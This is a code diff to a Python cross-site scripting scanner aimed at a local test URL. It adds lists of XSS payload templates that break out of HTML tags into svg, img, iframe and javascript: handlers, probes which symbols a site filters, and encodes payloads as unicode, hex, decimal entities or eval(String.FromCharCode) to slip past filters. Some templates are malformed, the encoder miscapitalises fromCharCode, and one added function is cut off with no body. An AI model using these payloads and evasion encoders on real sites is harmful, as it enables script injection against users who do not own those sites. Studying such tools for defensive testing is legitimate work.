@@ -12,34 +12,53 @@ import sys
 
 url = 'http://127.0.0.1/xss-example/';
 
-common_payload = '''
-(">|"/>|</[TAGNAME]>)<embed(/)[RND]src=[EVAL]>
-(">|"/>|</[TAGNAME]>)<svg(/)[RND]onload=[EVAL]>
-(">|"/>|</[TAGNAME]>)<style(/)[RND]onload=[EVAL]>
-(">|"/>|</[TAGNAME]>)<marquee(/)[RND]onstart=[EVAL]>
-(">|"/>|</[TAGNAME]>)<isindex(/)[RND](formaction)=[EVAL]>
-(">|"/>|</[TAGNAME]>)<object(/)[RND](data|onerror)=[EVAL]>
-(">|"/>|</[TAGNAME]>)<iframe(/)[RND]src=(EVAL|[RND]onload=[EVAL])>
-(">|"/>|</[TAGNAME]>)<(video|audio)(/)[RND]src=[RND]onerror=[EVAL]>
-(">|"/>|</[TAGNAME]>)<a(/)[RND](href|onmousemove|onmouseover|onclick)=[EVAL]>
-(">|"/>|</[TAGNAME]>)<body(/)[RND](onload|background|onerror|onclick)=[EVAL]>
-(">|"/>|</[TAGNAME]>)<var(/)[RND](onmousemove|onmouseover|onclick)=[EVAL]>[RND]
-(">|"/>|</[TAGNAME]>)<script[RND]>[RND](src|onerror)=[EVAL]>[EVAL]</script[RND]>
-(">|"/>|</[TAGNAME]>)<(div|span|a|[LETTER])(/)[RND](onmousemove|onmouseover|onclick)=[EVAL]>[RND]
-(">|"/>|</[TAGNAME]>)<(img|image)(/)[RND]src=(EVAL|[RND])(onerror|onmouseover|onmousemove|onclick)=[EVAL]>
-(">|"/>|</[TAGNAME]>)<(select|textarea|input|keygen)(/)[RND](autofocus)(onfocus|onmousemove|onmouseover|onclick)=[EVAL]>
-'''
-event_payload = '''
-"(/)(onload|onstart|onerror|onmousemove|onmouseover|onclick|background|src|onfocus|formaction|data|)=[EVAL](//)
-'''
-js_payload = '''
-(javascript:)alert`0`
-(javascript:)prompt`0`
-(javascript:)confirm`0`
-(javascript:)alert(0)
-(javascript:)prompt(0)
-(javascript:)confirm(0)
-'''
+symbols = '<>/\\\'"`();=&#\{\}+-%*:'
+keywords = (
+    'embed','src','svg','onload','style','marquee','onstart','object','data',
+    'onerror','iframe','video','audio','a','href','onmousemove','onmouseover',
+    'onclick','var','script','div','span','img','image','select','textarea',
+    'input','keygen','autofocus','onfocus','onstart','background','alert',
+    'prompt','confirm','javascript'
+)
+common_payload = (
+    r'{(">|"/>|</[TAGNAME]>}<embed{/}[RND]src=[EVAL]>',
+    r'{(">|"/>|</[TAGNAME]>}<svg{/}[RND]onload=[EVAL]>',
+    r'{">|"/>|</[TAGNAME]>}<style{/}[RND]onload=[EVAL]>',
+    r'{">|"/>|</[TAGNAME]>}<marquee{/}[RND]onstart=[EVAL]>',
+    r'{">|"/>|</[TAGNAME]>}<object{/}[RND](data|onerror)=[EVAL]>',
+    r'{">|"/>|</[TAGNAME]>}<iframe{/}[RND]src=(EVAL|[RND])onload=[EVAL])>',
+    r'{">|"/>|</[TAGNAME]>}<(video|audio){/}[RND]src=[RND]onerror=[EVAL]>',
+    r'{">|"/>|</[TAGNAME]>}<a{/}[RND](href|onmousemove|onmouseover|onclick)=[EVAL]>',
+    r'{">|"/>|</[TAGNAME]>}<body{/}[RND](onload|background|onerror|onclick)=[EVAL]>',
+    r'{">|"/>|</[TAGNAME]>}<var{/}[RND](onmousemove|onmouseover|onclick)=[EVAL]>[RND]',
+    r'{">|"/>|</[TAGNAME]>}<script[RND]>[RND](src|onerror)=[EVAL]>[EVAL]</script[RND]>',
+    r'{">|"/>|</[TAGNAME]>}<(div|span|a|[LETTER]){/}[RND](onmousemove|onmouseover|onclick)=[EVAL]>[RND]',
+    r'{">|"/>|</[TAGNAME]>}<(img|image){/}[RND]src=(EVAL|[RND])(onerror|onmouseover|onmousemove|onclick)=[EVAL]>',
+    r'{">|"/>|</[TAGNAME]>}<(select|textarea|input|keygen){/}[RND]autofocus(onfocus|onmousemove|onmouseover|onclick)=[EVAL]>'
+)
+event_payload = (
+    r'{/}(onload|onstart|onerror|onmousemove|onmouseover|onclick|background|src|onfocus|data|)=[EVAL]{//}'
+)
+
+js_payload = (
+    r'{javascript:}alert`0`',
+    r'{javascript:}prompt`0`',
+    r'{javascript:}confirm`0`',
+    r'{javascript:}alert(0)',
+    r'{javascript:}prompt(0)',
+    r'{javascript:}confirm(0)',
+)
+
+
+def payload_parse_synax(raw,info):
+    '''
+    Payload synax parse
+    '''
+    tagname = info['tagname']
+    isevent = info['isevent']
+    isclose = info['isclose']
+    SWITCH = r'\((.*?)\)'
+    OPTION = r'\{(.*?)\}'
 
 def get_dynamic_links_url(murl):
     '''
@@ -185,7 +204,6 @@ def get_xss_filter(links):
     find filtered keyword
     '''
     xlink = links
-    symbols = '<>/\\\'"`();=&#\{\}+-%*:'
     for murl,mitem in links.items():
         for method,item in mitem.items():
             for pos,params in item.items():
@@ -215,15 +233,32 @@ def get_xss_filter(links):
                         print(p,','.join([a for a in symbols if a not in allowed]),'filtered')
     return xlink
 
-def encode_xss_payload(payload,enctype):
+def encode_xss_payload(payload,entype):
     '''
     Encode xss payload
     '''
-    if enctype == 'unicode':
-        epayload = ''
+    if entype == 'uni':
+        uni_p = ''
         for p in payload:
-            epayload += '\\u00' + binascii.hexlify(p.encode('unicode-escape')).decode()
-        return epayload
+            uni_p += r'\u00' + binascii.hexlify(p.encode('unicode-escape')).decode()
+        return uni_p
+    elif entype == 'hex':
+        hex_p = ''
+        for p in payload:
+            hex_p += '&#x00' + binascii.hexlify(p.encode('unicode-escape')).decode() + ';'
+        return hex_p
+    elif entype == 'dec':
+        dec_p = ''
+        for p in payload:
+            dec_p += '&#' + str(ord(p)) + ';'
+        return dec_p
+    else:
+        asc_p = list()
+        for p in payload:
+            asc_p.append(str(ord(p)))
+        asc_p = 'eval(String.FromCharCode(' + ','.join(asc_p) + '))'
+        return asc_p    
+
 
 def automatic_gen_payload(result):
     '''
@@ -264,4 +299,3 @@ def inject_xss_payload(links):
 #plinks1 = get_output_position(ulinks)
 #plinks2 = get_output_position(flinks)
 #xlinks1 = get_xss_filter(plinks1)
-print(encode_xss_payload('alert(1)','unicode'))
